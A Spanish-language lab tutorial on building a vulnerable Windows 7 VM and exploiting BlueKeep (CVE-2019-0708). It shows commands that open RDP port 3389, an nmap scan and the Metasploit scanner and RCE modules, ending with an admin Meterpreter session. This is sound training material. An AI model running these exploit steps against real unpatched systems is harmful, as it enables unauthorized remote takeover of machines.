---
icon: bacterium
---

# BlueKeep Conf y Explotación

Primero obtendremos la OVA de un windows 7.

URL OVA = https://drive.google.com/file/d/1bwoAZpjrCqWljwbMoLmoLQRC5i1W\_pWQ/view?usp=sharing

Y si queremos la ISO para configurar los siguientes pasos desde 0 en la siguiente URL.

URL ISO = https://drive.google.com/file/d/1XDKg0wmhKDtC-CoPcKQwWD34nWr58YKF/view?usp=sharing

> Credentials W7

URL = https://drive.google.com/file/d/1k\_ne4v4IHBWFvQti9vox0Gyq2XNTGglk/view?usp=drive\_link

Una vez que hayamos importado la ISO en VMWare, los pasos de configuracion seran los siguientes.

Dentro de Windows 7 en el menu de configuracion del inicio, seleccionaremos la siguiente edicion.

```
Windows 7 Professional
```

> NOTA IMPORTANTE

Es importante elegir esta edicion, ya que de lo contrario no podremos obtener el puerto RPD (3389) para hacer nuestras pruebas de penetracion con el exploit BlueKeep.

Seguimos los siguientes pasos de normal.

Una vez dentro abrimos el cmd como administrador y pondremos los siguientes coamndos para habilitar el puerto RPD (3389).

```shell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

Creamos una regla en el Firewall para permitirlo.

```shell
netsh advfirewall firewall add rule name="Allow RDP" protocol=TCP dir=in localport=3389 action=allow
```

Y con esto verificamos que el puerto 3389 este activo.

```shell
netstat -an | find "3389"
```

Ahora en nuestra maquina atacante, ejecutaremos el `nmap` para verificar que este activo el puerto 3389 (RPD) en la maquina victima.

```shell
nmap -sCV -p3389 <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-26 12:46 CEST
Nmap scan report for 192.168.5.140
Host is up (0.00042s latency).

PORT     STATE SERVICE    VERSION
3389/tcp open  tcpwrapped
| ssl-cert: Subject: commonName=exploitbluekeep
| Not valid before: 2024-07-25T10:44:48
|_Not valid after:  2025-01-24T10:44:48
MAC Address: 00:0C:29:24:51:3E (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.91 seconds
```

Vemos que si esta activo, por lo que ahora pasaremos a la explotacion del exploit `BlueKeep`.

## <mark style="color:purple;">Explotacion con exploit BlueKeep</mark>

Primero haremos un scanner para ver si es vulnerable al BlueKeep.

```shell
msfconsole -q
```

```shell
search bluekeep
```

Seleccionamos el scanner.

```shell
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
```

Configuramos para que scanee a la IP victima.

```shell
show options
```

```shell
set RHOSTS <IP>
```

Ejecutamos el exploit.

```shell
run
```

Info:

```
[+] 192.168.5.140:3389    - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 192.168.5.140:3389    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Por lo que vemos dice que si es vulnerable, por lo que pasaremos a explotarlo del todo.

```shell
search bluekeep
```

Utilizamos el exploit con el que nos va a crear una shell a la maquina windows.

```shell
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

Configuramos todo el exploit.

```shell
show options
```

```shell
set RHOSTS <IP>
```

```shell
show targets
```

Info:

```
Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Automatic targeting via fingerprinting
    1   Windows 7 SP1 / 2008 R2 (6.1.7601 x64)
    2   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox 6)
    3   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 14)
    4   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15)
    5   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1)
    6   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)
    7   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - AWS)
    8   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - QEMU/KVM)
```

Aqui seleccionamos el que se adapte a nuestras necesidades.

```shell
set target 4
```

Ejecutamos el exploit.

```shell
exploit
```

Y con esto ya nos habria creado una sesion con un meterpreter autenticada como admin.
